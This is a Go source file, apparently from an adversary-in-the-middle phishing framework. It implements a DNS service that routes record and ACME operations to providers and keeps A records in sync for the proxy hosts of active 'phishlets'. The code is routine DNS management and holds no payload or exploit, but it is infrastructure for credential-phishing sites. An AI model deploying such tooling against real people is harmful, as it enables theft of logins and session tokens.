package aitm

import (
	"context"
	"errors"
	"fmt"
	"log/slog"
	"strings"
	"sync"
)

var ErrRecordExists = errors.New("dns: record already exists")
var ErrRecordNotFound = errors.New("dns: record not found")

// DNSProvider is the interface that dns provider implementations satisfy implicitly.
// It covers record management, ACME DNS-01 challenge support, and health checking.
// Implementations must be safe for concurrent use.
type DNSProvider interface {
	CreateRecord(zone, name, typ, value string, ttl int) error
	UpdateRecord(zone, name, typ, value string, ttl int) error
	DeleteRecord(zone, name, typ string) error

	// ACME DNS-01 challenge support.
	Present(domain, token, keyAuth string) error
	CleanUp(domain, token, keyAuth string) error

	Ping() error

	// Name returns a short provider identifier, e.g. "builtin" or "cloudflare".
	Name() string
}

// ZoneConfig pairs a zone (base domain) with its provider alias and the
// external IP to use for A records.
type ZoneConfig struct {
	Zone         string
	ProviderName string
	ExternalIP   string
}

// PhishletRecord is the set of DNS records that must exist for one proxy host
// inside an active phishlet.
type PhishletRecord struct {
	Zone string
	Name string // relative subdomain
	IP   string // overrides ZoneConfig.ExternalIP when non-empty
}

// DNSService routes DNS record operations to the appropriate provider for each
// configured zone, and reconciles the desired record state for active phishlets.
type DNSService struct {
	mu        sync.RWMutex
	providers map[string]DNSProvider // key: provider alias
	zones     map[string]ZoneConfig  // key: zone (base domain)
	bus       eventBus
}

func NewDNSService(providers map[string]DNSProvider, zones map[string]ZoneConfig, bus eventBus) *DNSService {
	return &DNSService{
		providers: providers,
		zones:     zones,
		bus:       bus,
	}
}

func (s *DNSService) providerFor(zone string) (DNSProvider, ZoneConfig, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	zoneConfig, ok := s.zones[zone]
	if !ok {
		return nil, ZoneConfig{}, fmt.Errorf("dns: no provider configured for zone %q", zone)
	}

	dnsProvider, ok := s.providers[zoneConfig.ProviderName]
	if !ok {
		return nil, ZoneConfig{}, fmt.Errorf("dns: provider alias %q not found", zoneConfig.ProviderName)
	}

	return dnsProvider, zoneConfig, nil
}

// zoneForDomain finds the longest matching configured zone for a given FQDN.
func (s *DNSService) zoneForDomain(fqdn string) string {
	s.mu.RLock()
	defer s.mu.RUnlock()

	best := ""
	for zone := range s.zones {
		if strings.HasSuffix(fqdn, "."+zone) || fqdn == zone {
			if len(zone) > len(best) {
				best = zone
			}
		}
	}

	return best
}

func (s *DNSService) CreateRecord(zone, name, typ, value string, ttl int) error {
	provider, _, err := s.providerFor(zone)
	if err != nil {
		return err
	}

	return provider.CreateRecord(zone, name, typ, value, ttl)
}

func (s *DNSService) UpdateRecord(zone, name, typ, value string, ttl int) error {
	provider, _, err := s.providerFor(zone)
	if err != nil {
		return err
	}

	return provider.UpdateRecord(zone, name, typ, value, ttl)
}

func (s *DNSService) DeleteRecord(zone, name, typ string) error {
	provider, _, err := s.providerFor(zone)
	if err != nil {
		return err
	}

	return provider.DeleteRecord(zone, name, typ)
}

func (s *DNSService) Present(domain, token, keyAuth string) error {
	zone := s.zoneForDomain(domain)
	provider, _, err := s.providerFor(zone)
	if err != nil {
		return err
	}

	return provider.Present(domain, token, keyAuth)
}

func (s *DNSService) CleanUp(domain, token, keyAuth string) error {
	zone := s.zoneForDomain(domain)
	provider, _, err := s.providerFor(zone)
	if err != nil {
		return err
	}

	return provider.CleanUp(domain, token, keyAuth)
}

// Reconcile creates or updates DNS records to match the desired state.
// It is idempotent — calling it twice with the same desired state is safe.
func (s *DNSService) Reconcile(ctx context.Context, desiredRecord []PhishletRecord) error {
	var errs []error
	for _, record := range desiredRecord {
		provider, zoneConfig, err := s.providerFor(record.Zone)
		if err != nil {
			errs = append(errs, err)
			continue
		}

		ip := record.IP
		if ip == "" {
			ip = zoneConfig.ExternalIP
		}

		if err := provider.CreateRecord(record.Zone, record.Name, "A", ip, 300); err != nil {
			if errors.Is(err, ErrRecordExists) {
				if uerr := provider.UpdateRecord(record.Zone, record.Name, "A", ip, 300); uerr != nil {
					errs = append(errs, uerr)
					continue
				}
			} else {
				errs = append(errs, err)
				continue
			}
		}

		slog.Info("dns record ensured",
			"zone", record.Zone,
			"name", record.Name,
			"ip", ip,
			"provider", provider.Name(),
		)
	}

	if len(errs) > 0 {
		return errors.Join(errs...)
	}
	s.bus.Publish(Event{
		Type:    EventDNSRecordSynced,
		Payload: desiredRecord,
	})

	return nil
}

// RemoveRecords cleans up DNS records when a phishlet is disabled.
func (s *DNSService) RemoveRecords(ctx context.Context, records []PhishletRecord) error {
	var errs []error
	for _, record := range records {
		provider, _, err := s.providerFor(record.Zone)
		if err != nil {
			errs = append(errs, err)
			continue
		}

		if err := provider.DeleteRecord(record.Zone, record.Name, "A"); err != nil {
			errs = append(errs, err)
			continue
		}

		slog.Info("dns record removed",
			"zone", record.Zone,
			"name", record.Name,
			"provider", provider.Name(),
		)
	}

	return errors.Join(errs...)
}
